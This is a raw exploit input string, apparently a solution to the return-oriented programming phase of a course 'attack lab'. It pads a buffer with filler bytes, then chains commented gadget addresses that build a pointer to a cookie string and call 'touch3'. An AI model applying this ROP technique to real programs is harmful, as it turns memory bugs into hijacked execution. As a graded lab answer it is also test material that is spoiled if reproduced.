30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30
30 30 30 30 30


ab 19 40 00 00 00 00 00   /* pop rax */
20 00 00 00 00 00 00 00   /* rax = 32 */ 
42 1a 40 00 00 00 00 00   /* movl eax edx */
34 1a 40 00 00 00 00 00   /* movl edx ecx */
27 1a 40 00 00 00 00 00   /* movl ecx esi */
06 1a 40 00 00 00 00 00   /* movq rsp rax */

c5 19 40 00 00 00 00 00   /* movq rax rdi */
d6 19 40 00 00 00 00 00   /* rax = rsi + rdi */
c5 19 40 00 00 00 00 00   /* movq rax rdi */
fa 18 40 00 00 00 00 00   /* call touch3 */

35 39 62 39 39 37 66 61 00

